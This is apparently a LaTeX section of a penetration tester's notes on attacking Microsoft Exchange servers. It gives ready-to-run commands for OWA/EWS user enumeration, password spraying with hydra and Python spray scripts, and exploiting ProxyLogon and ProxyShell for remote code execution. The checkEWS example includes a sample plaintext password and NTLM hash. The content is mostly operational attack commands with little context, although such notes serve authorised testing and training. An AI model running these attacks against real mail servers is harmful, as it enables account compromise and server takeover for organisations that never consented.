
\section{Attacks}
\subsection{intro}

\begin{figure}[!ht]
  \includegraphics[width=\linewidth]{network/exchange/images/exchange-mindmap.png}
  \caption{Exchange attack mindmap}
  \label{fig:exchange-attack-mindmap}
\end{figure}

\href{https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png}{attack mindmap}


\subsection{Valid user enumeration}


\subsubsection{Powershell MailSniperi (OWA/EWS)}
\begin{verbatim}
Invoke-UsernameHarvestOWA –UserList .\username_list.txt 
    –ExchHostname mail.domain.com –Domain the_identified_internal_domain_name 
    –OutFile potential_usernames.txt -Threads 25
\end{verbatim}

\subsubsection{Metasploit (OWA)}
msf (\verb+auxiliary/scanner/http/owa_login+)

\subsubsection{msmailprobe (OWA)}
\begin{verbatim}
msmailprobe userenum --onprem -t rastalabs.local -U ./users.txt -o valids.txt
\end{verbatim}

\subsection{Bruteforce/spraying attack}

\subsubsection{OWA}

Windows:
\begin{itemize}
    \item 
        mailsniper
\end{itemize}

Linux:
\begin{itemize}
    \item 
        msf (\verb+auxiliary/scanner/http/owa_login+)
    \item
        msf (\verb+auxiliary/scanner/http/owa_ews_login+)
    \item
        \verb+owabf2.py+
    \item
        \verb+owabrute.sh+
    \item hydra
        \begin{verbatim}
        hydra   -I -t 40           \
                -L "${USERSLIST}"  \
                -e s -u   -f        \
                -P "${PASSLIST}" \
                "${DOMAIN}"       \
                https-post-form "/owa/auth.owa:flags=4&destination=https\://${DOMAIN}/owa/&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=The user name or password"
        \end{verbatim}
    \item  
        \href{https://raw.githubusercontent.com/3gstudent/Homework-of-Python/master/checkOWA.py}{checkOWA.py} 
\end{itemize}



\subsubsection{EWS}

linux:
\begin{itemize}
    \item 
        \href{https://raw.githubusercontent.com/3gstudent/Homework-of-Python/master/checkEWS.py}{checkEWS.py}:
    \begin{verbatim}
        python checkEWS.py 10.10.110.254 443 plaintext rlab ahope Summer2023
        checkEWS.py test.com 80 ntlmhash test.com user1 c5a237b7e9d8e708d8436b6148a25fa1
    \end{verbatim}
    \item
        \href{https://github.com/iomoath/PyExchangePasswordSpray}{exchange\_password\_spray.py}:
        \begin{verbatim}
        python3 exchange_password_spray.py -U userlist.txt -P password.txt \
            --url https://webmail.example.org/EWS/Exchange.asmx \
            --delay 62 -T 1 \
            -ua "Microsoft Office/16.0 (Windows NT 10.0; MAPI 16.0.9001; Pro)" \
            -O result.txt -v
        \end{verbatim}
        
\end{itemize}


\subsubsection{Autodiscover}
ruler


\subsection{CVE}
\subsubsection{RCE (Proxylogon)}
ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin.

We have also chained this bug with another post-auth arbitrary-file-write vulnerability, CVE-2021-27065, to get code execution.

metasploit (\verb+scanner/http/exchange_proxylogon+)
\begin{verbatim}
set RHOSTS <ip>
\end{verbatim}

\href{https://github.com/hakivvi/proxylogon}{proxylogon.py}:
\begin{verbatim}
python3 proxylogon.py http://mail.corp.com email@corp.com
\end{verbatim}

\subsubsection{RCE (ProxyShell)}
CVE-2021-34473 Microsoft Exchange Server Remote Code Execution Vulnerability. This faulty URL normalization lets us access an arbitrary backend URL while running as the Exchange Server machine account. Although this bug is not as powerful as the SSRF in ProxyLogon, and we could manipulate only the path part of the URL

\href{https://github.com/kh4sh3i/ProxyShell}{ProxyShell}

recon:
\begin{verbatim}
nuclei -u target.com -t proxyshell.yaml
\end{verbatim}

shell:
\begin{verbatim}
sudo python3 ProxyShell.py -u https://<IP>
\end{verbatim}

